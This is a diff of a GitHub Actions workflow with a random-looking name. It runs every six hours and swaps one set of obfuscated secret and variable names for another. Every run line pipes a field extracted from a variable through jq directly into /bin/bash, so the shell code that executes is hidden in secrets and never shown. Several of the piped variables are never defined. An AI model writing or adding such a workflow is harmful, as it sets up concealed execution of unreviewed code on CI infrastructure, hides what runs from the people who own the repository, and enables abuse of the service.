@@ -2,7 +2,7 @@ name: equationpreviously
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
+    - cron: '28 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +10,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: equationpreviously
         env:
-          hqgs168: ${{ secrets.hqgs168 }}
+          v003: ${{ secrets.v003 }}
         run: |
-          echo $hqgs168 | jq -r .dkw987 | /bin/bash
-          echo $prc13 | jq -r .u208 | /bin/bash
-          echo $k300 | jq -r .ck397 | /bin/bash
-          echo $zzaw5159 | jq -r .vnsi529 | /bin/bash
-          echo $gw82876 | jq -r .w7099 | /bin/bash
-          echo $a82849 | jq -r .j68475 | /bin/bash
-          echo $rg741 | jq -r .j124 | /bin/bash
+          echo $v003 | jq -r .wx4 | /bin/bash
+          echo $kxayy9 | jq -r .t8 | /bin/bash
+          echo $mrqmy8454 | jq -r .ulq60 | /bin/bash
+          echo $xtd439 | jq -r .ub619 | /bin/bash
+          echo $aermy68227 | jq -r .bqrx050 | /bin/bash
 
